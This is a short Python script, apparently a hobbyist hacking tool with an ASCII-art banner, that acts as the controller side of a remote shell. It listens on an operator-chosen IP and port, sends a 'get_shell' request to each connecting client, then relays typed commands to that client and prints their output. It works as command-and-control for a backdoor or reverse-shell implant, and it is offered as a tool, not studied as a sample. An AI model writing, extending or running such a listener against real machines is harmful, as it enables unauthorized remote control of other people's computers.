import socket

#-----------------------------------------------------------------------------------------------------------------------

print("""
---------------------------------------------------------------------
|   @@@@@@@@@   @        @  @     @  @@@@@@@@@@@@@  @@@@@@@@@@@@@@@ | 
|   @       @   @ @      @  @    @         @               @        |
|   @       @   @  @     @  @   @          @               @        |
|   @       @   @   @    @  @  @           @               @        |
|   @@@@@@@@@   @    @   @  @@@            @               @        |
|   @       @   @     @  @  @  @           @               @        |
|   @       @   @      @ @  @   @          @               @        |
|   @       @   @       @@  @    @         @               @        |
|   @       @   @        @  @     @  @@@@@@@@@@@@@         @        |
---------------------------------------------------------------------

""")
#-----------------------------------------------------------------------------------------------------------------------


def handle_shell(conn):
    print("Connected to client. Sending shell request.")
    conn.send(b"get_shell")  # Send a shell request to the client

    while True:
        command = input("> ")  # Get a shell command from the server user
        conn.send(command.encode("utf-8"))  # Send the command to the client

        if command.strip().lower() == 'quit':
            conn.close()
            print("Connection closed.")
            break

        response = conn.recv(4096).decode("utf-8")  # Receive the command output from the client
        print(response)

def main():
    bind_ip = input('Enter Your IP To Listen (Server): ')
    bind_port = int(input("Enter The Port: "))

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((bind_ip, bind_port))
    server.listen(5)
    print("[*] Listening on {}:{}".format(bind_ip, bind_port))

    while True:
        conn, addr = server.accept()
        handle_shell(conn)

if __name__ == "__main__":
    main()
